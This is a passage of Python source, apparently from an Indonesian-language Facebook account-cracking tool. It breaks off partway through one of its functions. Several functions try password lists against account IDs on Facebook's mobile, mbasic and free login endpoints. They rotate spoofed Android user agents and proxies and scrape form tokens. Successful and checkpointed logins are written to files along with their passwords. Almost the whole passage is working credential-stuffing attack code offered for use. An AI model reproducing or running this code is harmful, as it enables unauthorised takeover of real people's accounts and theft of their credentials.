	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sambro} Chrome/{chrome_version} Mobile Safari/537.36'
	return ua
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen2)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Asycn m.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
			#	print(f'{P} FACEBOOK ACCOUNT YEAR : {k}{tahun(idf)}')
				tree = Tree(' ')
				tree.add(f'•{P}[{K2}CP{K2}]•').add(f'{K2}{idf} • {pw}')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			#	print(f'{P}FACEBOOK ACCOUNT YEAR : {h}{tahun(idf)}')
				tree = Tree(' ')
				tree.add(f'•{P}[{H2}OK{P}]•').add(f'{H2}{idf} • {pw}')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE MOBILE V2 ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen2)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Validate M. facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen2)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Asycn Mbasic.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent':ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=950160105669643&auth_token=ac271a0b69b219581ad260574e470ce4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&refsrc=deprecated&app_id=950160105669643&cancel=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE FREE]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen2)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Reguler Free.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen2)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Lawak V1{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link=ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
